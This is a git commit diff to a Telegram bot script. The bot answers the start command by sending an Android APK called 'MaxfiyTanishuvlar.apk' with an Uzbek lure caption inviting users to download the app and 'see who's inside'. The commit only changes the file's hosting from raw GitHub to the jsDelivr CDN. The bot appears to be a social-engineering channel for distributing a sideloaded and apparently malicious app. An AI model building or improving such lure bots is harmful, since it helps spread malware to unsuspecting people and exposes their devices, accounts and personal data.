1d41d1b34ccdf86c4dc4e0c0bd132a35fabb5c9f
annavladimirovnaoreh1962-lang <anna.vladimirovna.oreh.1962@gmail.com>
2026-09-12 15:03:22 +0300

    Change document URL in bot response
    Updated the document URL in the start command response.

--- bot.py
+++ bot.py
@@ -14,7 +14,7 @@ dp = Dispatcher()
 @dp.message(CommandStart())
 async def start(message: Message):
     await message.answer_document(
-        document="https://raw.githubusercontent.com/annavladimirovnaoreh1962-lang/Datuz/main/MaxfiyTanishuvlar.apk",
+        document="https://cdn.jsdelivr.net/gh/annavladimirovnaoreh1962-lang/Datuz@main/MaxfiyTanishuvlar.apk",
         caption="🇺🇿 Ichkarida kim borligini ko'rmoqchisanmi? Ilovani yuklab ol va kir 👀🔥"
     )
 
